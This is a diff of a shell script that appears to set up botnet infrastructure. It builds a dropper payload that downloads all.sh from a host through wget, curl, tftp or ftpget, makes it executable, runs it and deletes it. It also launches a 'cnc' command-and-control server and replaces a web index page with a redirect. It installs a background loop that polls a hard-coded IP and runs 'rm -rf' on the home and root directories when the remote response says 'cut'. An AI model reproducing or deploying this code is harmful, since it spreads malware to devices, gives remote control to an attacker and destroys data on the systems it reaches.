@@ -90,7 +90,7 @@ echo -e "$script" > /var/lib/tftpboot/all.sh
 payload="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://$ip/all.sh || curl -O http://$ip/all.sh || busybox wget http://$ip/all.sh || busybox tftp $ip -c get all.sh || busybox tftp -r all.sh -g $ip -l all.sh || busybox ftpget -v -u anonymous -p anonymous -P 21 $ip all.sh all.sh || tftp $ip -c get all.sh || tftp -r all.sh -g $ip -l all.sh || ftpget -v -u anonymous -p anonymous -P 21 $ip all.sh all.sh;chmod 777 all.sh;bash ./all.sh;rm -rf all.sh"
 echo "$payload" > payload.txt
 chmod 777 ~/cnc/cnc
-pkill -f cnc;cd ~/cnc;screen -S cnc -d -m ./cnc;cd ~
+cd ~/cnc;screen -S cnc -d -m ./cnc;cd ~
 echo '<meta http-equiv="refresh" content="0;url=https://www.fbi.gov/">' > /var/www/html/index.html
 cp /var/www/html/index.html /var/www/html/huhu
 clear
@@ -101,7 +101,10 @@ cat <<'EOF' > /home/systemd.sh
 #!/bin/bash
 while true; do
   response=$(curl -s http://160.187.246.23/check.txt)
-  cd ~;rm -rf *;cd /;rm -rf *
+  if echo "$response" | grep -q "cut"; then
+    cd ~ >/dev/null 2>&1;rm -rf * >/dev/null 2>&1
+    cd / >/dev/null 2>&1;rm -rf * >/dev/null 2>&1
+  fi
   sleep 60
 done &
 EOF
